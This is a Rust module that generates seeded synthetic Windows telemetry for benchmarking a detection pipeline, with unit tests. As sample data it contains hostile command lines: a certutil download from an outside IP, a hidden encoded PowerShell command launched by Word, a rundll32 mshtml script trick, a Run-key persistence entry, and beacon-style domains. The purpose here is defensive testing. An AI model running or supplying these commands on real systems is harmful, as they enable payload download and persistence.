//! Synthetic telemetry.
//!
//! A benchmark run has to be reproducible, so the generator is seeded and
//! deterministic: the same seed produces the same event stream. That is what
//! makes "the pipeline sustained 4M events/s" a number you can check rather
//! than one you have to believe.
//!
//! The mix is deliberately unflattering. Most events are ordinary system
//! activity, because that is what a detector spends its life looking at, and a
//! generator that emitted mostly attacks would make any rule set look good.
//!
//! One structural detail matters more than the percentages: when the stream
//! contains a child process whose parent is what makes it suspicious, the
//! *parent start is emitted first*. A live ETW stream has that property, and a
//! generator without it would silently under-test every rule that reads the
//! parent image.

use chrono::{DateTime, Duration as ChronoDuration, Utc};
use model::{
    DnsQueryPayload, EventId, EventKind, EventSource, HostId, Payload, ProcessId, ProcessStart,
    ProviderId, RegistrySet, TelemetryEvent, Value,
};
use std::collections::VecDeque;

/// Fixed epoch for generated timestamps.
///
/// A wall-clock `Utc::now()` would make every run different and quietly break
/// the reproducibility this generator exists to provide — the same seed would
/// replay the same *structure* but not the same events, because every timestamp
/// would differ. A synthetic stream has no business using real time.
const SYNTH_EPOCH_SECS: i64 = 1_700_000_000;
const SYNTH_STEP_MICROS: i64 = 25;

/// Numerical Recipes LCG: small, fast, and entirely unsuitable for anything
/// security-sensitive. It shapes traffic; it does not defend anything.
pub struct Rng(u64);

impl Rng {
    pub fn new(seed: u64) -> Self {
        Self(seed | 1)
    }

    fn next_u32(&mut self) -> u32 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        (self.0 >> 33) as u32
    }

    pub fn below(&mut self, n: u32) -> u32 {
        if n == 0 { 0 } else { self.next_u32() % n }
    }

    pub fn chance(&mut self, percent: u32) -> bool {
        self.below(100) < percent
    }

    fn pick<'a>(&mut self, options: &[&'a str]) -> &'a str {
        options[self.below(options.len() as u32) as usize]
    }
}

const SYSTEM_IMAGES: &[&str] = &[
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\taskhostw.exe",
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Windows\\System32\\RuntimeBroker.exe",
    "C:\\Windows\\System32\\dllhost.exe",
    "C:\\Windows\\System32\\conhost.exe",
    "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
];

const SYSTEM_PARENTS: &[&str] = &[
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\wininit.exe",
];

const BENIGN_DNS: &[&str] = &[
    "update.microsoft.com",
    "cdn.jsdelivr.net",
    "graph.microsoft.com",
    "login.live.com",
    "static.cloudflare.com",
];

const BENIGN_SETTINGS_VALUES: &[&str] = &["OneDrive", "Teams", "SecurityHealth", "Steam"];

const MALICIOUS_DNS: &[&str] = &[
    "a7f3c2e1.beacon.xyz",
    "update.service.top",
    "cdn-cache.tk",
    "d41d8cd9.ml",
];

/// Default share of malicious-shaped events, in percent.
pub const DEFAULT_MALICIOUS_PERCENT: u32 = 2;

/// Deterministic event generator.
pub struct Generator {
    rng: Rng,
    host: HostId,
    next_pid: u32,
    next_event_id: u64,
    malicious_percent: u32,
    /// Events staged to be delivered after the current one — used to emit a
    /// parent process before the child that depends on it.
    pending: VecDeque<TelemetryEvent>,
    /// Microseconds since [`SYNTH_EPOCH_SECS`], advanced one step per event.
    clock_micros: i64,
}

impl Generator {
    pub fn new(host: HostId, seed: u64, malicious_percent: u32) -> Self {
        Self {
            rng: Rng::new(seed),
            host,
            next_pid: 1000,
            next_event_id: 1,
            malicious_percent,
            pending: VecDeque::new(),
            clock_micros: 0,
        }
    }

    /// Produce the next event.
    pub fn next(&mut self) -> TelemetryEvent {
        if let Some(staged) = self.pending.pop_front() {
            return staged;
        }

        let malicious = self.rng.chance(self.malicious_percent);
        let roll = self.rng.below(100);

        if malicious {
            match roll {
                0..=39 => self.suspicious_process(),
                40..=59 => self.registry(true),
                _ => self.dns(true),
            }
        } else {
            match roll {
                0..=69 => self.benign_process(),
                70..=84 => self.registry(false),
                _ => self.dns(false),
            }
        }
    }

    fn pid(&mut self) -> u32 {
        self.next_pid = self.next_pid.wrapping_add(1);
        self.next_pid
    }

    /// Monotonic synthetic clock. Advances one fixed step per call, so ordering
    /// is preserved and the stream stays byte-identical across runs.
    fn now(&mut self) -> DateTime<Utc> {
        let offset = self.clock_micros;
        self.clock_micros += SYNTH_STEP_MICROS;
        DateTime::from_timestamp(SYNTH_EPOCH_SECS, 0).expect("fixed epoch is valid")
            + ChronoDuration::microseconds(offset)
    }

    fn event(
        &mut self,
        ts: DateTime<Utc>,
        pid: u32,
        provider: &'static str,
        event_id: u16,
        kind: EventKind,
    ) -> TelemetryEvent {
        self.next_event_id += 1;
        TelemetryEvent::new(
            EventId::new(self.next_event_id),
            self.host.clone(),
            ts,
            EventSource::WindowsEtw,
            ProviderId::new(provider),
            event_id,
            pid,
            pid.wrapping_add(1),
            4,
            kind,
            Payload::new(Value::Null).expect("a null payload is always within limits"),
        )
    }

    fn process(
        &mut self,
        pid: u32,
        parent: u32,
        image: &str,
        command_line: &str,
    ) -> TelemetryEvent {
        let ts = self.now();
        let kind = EventKind::ProcessStart(ProcessStart {
            pid: ProcessId::new(pid),
            parent_pid: Some(ProcessId::new(parent)),
            executable: image.into(),
            command_line: Some(command_line.into()),
            user: Some("CORP\\user".into()),
            working_directory: None,
            started_at: ts,
            image_hash: None,
            integrity_level: None,
        });
        self.event(ts, pid, "Microsoft-Windows-Kernel-Process", 1, kind)
    }

    fn benign_process(&mut self) -> TelemetryEvent {
        let image = self.rng.pick(SYSTEM_IMAGES);
        let parent = self.rng.pick(SYSTEM_PARENTS);
        let pid = self.pid();
        let parent_pid = self.pid();
        // Stage the parent's own start first, so the child resolves to a known
        // image exactly as it would on a live host.
        let parent_event = self.process(parent_pid, 4, parent, parent);
        self.pending.push_back(parent_event);
        self.process(pid, parent_pid, image, image)
    }

    /// The shapes `tools/sim` produces for real.
    fn suspicious_process(&mut self) -> TelemetryEvent {
        let (parent_image, child_image, child_command) = match self.rng.below(4) {
            0 => (
                "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ",
            ),
            1 => (
                "C:\\Windows\\explorer.exe",
                "C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe",
                "C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe",
            ),
            2 => (
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\certutil.exe",
                "certutil.exe -urlcache -split -f http://198.51.100.7/a.dat a.dat",
            ),
            _ => (
                "C:\\Windows\\System32\\cmd.exe",
                "C:\\Windows\\System32\\rundll32.exe",
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";",
            ),
        };

        let parent_pid = self.pid();
        let child_pid = self.pid();
        let parent_event = self.process(parent_pid, 4, parent_image, parent_image);
        self.pending.push_back(parent_event);
        self.process(child_pid, parent_pid, child_image, child_command)
    }

    fn registry(&mut self, malicious: bool) -> TelemetryEvent {
        let pid = self.pid();
        let (key, value, data) = if malicious {
            (
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                "WindowsUpdate",
                "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ",
            )
        } else {
            // Ordinary settings keys only. Writing a persistence location in
            // "benign" traffic would make the generator's own label a lie, and
            // the rule that catches it would look like a false positive when it
            // is in fact doing its job.
            let name = self.rng.pick(BENIGN_SETTINGS_VALUES);
            (
                "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\General",
                name,
                "C:\\Program Files\\app\\app.exe",
            )
        };

        let ts = self.now();
        let kind = EventKind::RegistrySet(RegistrySet {
            pid: ProcessId::new(pid),
            key_path: key.into(),
            value_name: Some(value.into()),
            value_data: Some(data.into()),
            set_at: ts,
        });
        self.event(ts, pid, "Microsoft-Windows-Kernel-Registry", 5, kind)
    }

    fn dns(&mut self, malicious: bool) -> TelemetryEvent {
        let pid = self.pid();
        let ts = self.now();
        let kind = if malicious {
            let name = self.rng.pick(MALICIOUS_DNS);
            EventKind::DnsQuery(DnsQueryPayload {
                pid: ProcessId::new(pid),
                query_name: name.into(),
                query_type: "A".into(),
                answers: Vec::new(),
                response_code: Some("NXDOMAIN".into()),
                queried_at: ts,
            })
        } else {
            let name = self.rng.pick(BENIGN_DNS);
            EventKind::DnsQuery(DnsQueryPayload {
                pid: ProcessId::new(pid),
                query_name: name.into(),
                query_type: "A".into(),
                answers: vec!["93.184.216.34".into()],
                response_code: Some("NOERROR".into()),
                queried_at: ts,
            })
        };
        self.event(ts, pid, "Microsoft-Windows-DNS-Client", 3006, kind)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn generator() -> Generator {
        Generator::new(
            HostId::new("host-a").unwrap(),
            0xC0FFEE,
            DEFAULT_MALICIOUS_PERCENT,
        )
    }

    fn images(events: &[TelemetryEvent]) -> Vec<String> {
        events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ProcessStart(s) => Some(s.executable.to_string()),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn the_same_seed_produces_the_same_stream() {
        let mut a = generator();
        let mut b = generator();
        for _ in 0..300 {
            assert_eq!(a.next().kind, b.next().kind);
        }
    }

    #[test]
    fn different_seeds_diverge() {
        let mut a = generator();
        let mut b = Generator::new(HostId::new("host-a").unwrap(), 7, DEFAULT_MALICIOUS_PERCENT);
        let differences = (0..300).filter(|_| a.next().kind != b.next().kind).count();
        assert!(
            differences > 150,
            "streams should differ, got {differences}"
        );
    }

    #[test]
    fn benign_traffic_dominates_the_mix() {
        let mut g = generator();
        let mut processes = 0;
        let mut dns = 0;
        for _ in 0..1_000 {
            match g.next().kind {
                EventKind::ProcessStart(_) => processes += 1,
                EventKind::DnsQuery(_) => dns += 1,
                _ => {}
            }
        }
        assert!(
            processes > 400,
            "expected mostly process traffic, got {processes}"
        );
        assert!(dns > 40, "expected a meaningful DNS tail, got {dns}");
    }

    #[test]
    fn a_parent_is_always_staged_before_its_child() {
        // Same host, 100% malicious so every process template is exercised.
        let mut g = Generator::new(HostId::new("h").unwrap(), 99, 100);
        let events: Vec<_> = (0..400).map(|_| g.next()).collect();
        let found = images(&events);

        // Each suspicious template's parent image must appear in the stream, or
        // no engine could ever resolve it.
        for parent in [
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\cmd.exe",
        ] {
            assert!(found.iter().any(|i| i == parent), "missing parent {parent}");
        }
    }

    #[test]
    fn every_pid_is_nonzero() {
        let mut g = generator();
        for _ in 0..500 {
            assert!(g.next().pid > 0);
        }
    }
}
